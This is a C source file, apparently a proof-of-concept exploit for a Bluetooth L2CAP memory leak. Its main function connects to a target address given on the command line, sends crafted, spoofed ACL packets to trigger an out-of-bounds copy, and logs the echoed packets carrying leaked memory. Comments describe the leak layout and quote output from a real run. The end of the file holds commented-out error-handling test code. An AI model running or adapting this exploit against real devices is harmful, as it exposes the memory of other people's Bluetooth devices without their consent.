#include "log.h"
#include "errors.h"
#include "bluetooth.h"

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

err_t exploit(const char *bdaddr_str)
{
    // Create both sockets
    int hci_sock_fd, l2cap_sock_fd;
    ERR_FWD(bluetooth_hci_create(&hci_sock_fd));
    ERR_FWD(bluetooth_l2cap_create(&l2cap_sock_fd));

    // Connect to the Bluetooth address
    uint16_t hci_handle;
    ERR_FWD(bluetooth_l2cap_connect(l2cap_sock_fd, bdaddr_str, &hci_handle))

    uint8_t buffer[512];
    memset(buffer, 'A', sizeof(buffer));

    // Send the trigger packets
    // ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 0, 0, false, buffer, 70))
    ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 55, 2, false, buffer, 70))
    ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 22, 0, true, buffer, 70))

    // Receive the echo packets
    while (1)
    {
        size_t read_amount;
        ERR_FWD(bluetooth_l2cap_recv(l2cap_sock_fd, buffer, sizeof(buffer), &read_amount));
        logl_hex(buffer, read_amount);

        // One of the packets we receive is going to be the echo packet with the leaked data
        // As mentioned in the memcpy_trace_negative.txt file, the copy should be something like this:
        //      - Source:      [ ### 64 Bytes ### ] [ ??? 2 Bytes ??? ] !SRC ADDRESS! [ ### 76 Bytes ### ]
        //      - Destination: [ $$$ 64 Bytes $$$ ] [ ??? 2 Bytes ??? ] !DST ADDRESS! [ $$$ 76 Bytes $$$ ]
        // Where:
        //      - Copied To:      $
        //      - Copied From:    #
        //      - Left Unchanged: ?
        // And so we leak something like this (this is an actual execution):
        //      ~: [*] 09 37 48 00 41 41 41 41 00 00 00 00 00 00 00 00
        //      ~: [*] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
        //      ~: [*] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
        //      ~: [*] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 11
        //      ~: [*] 02 00 04 00 00 00 02 10 41 41 4A 00
        //          All before is leaked______|^^^^^|______All after is leaked
        //                                     These are the 2 Bytes that are unchanged
    }

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <bdaddr>\n", argv[0]);
        printf("Example: %s 00:11:22:33:44:55\n", argv[0]);

        return -1;
    }

    int ret = 0;

    err_t err = exploit(argv[1]);
    if (err)
    {
        err_print_free(err);
        ret = -1;
    }

    return ret;
}

// err_t func1();
// err_t func2();
// err_t func3();
// err_t func4();

// int main(int argc, char **argv)
// {
//     printf("Hello, world!\n");

//     err_print_free(func4());

//     return 0;
// }

// err_t func1()
// {
//     // ERR_RET("ERR1", NULL);

//     // ERR_RET("ERR1", "Aw Snap!");

//     // char msg[] = "Aw Snap!";
//     // ERR_RET("ERR1", msg);

//     char *msg = (char*)malloc(9);
//     strcpy(msg, "Aw Snap!");
//     ERR_RET("ERR1", msg);

//     return NULL;
// }

// err_t func2()
// {
//     // ERR_FWD(func1());

//     err_t err = func1();
//     ERR_FWD(err);
// }

// err_t func3()
// {
//     ERR_FWD_MSG("ERR3", func2());
// }

// err_t func4()
// {
//     ERR_FWD(func3());
// }
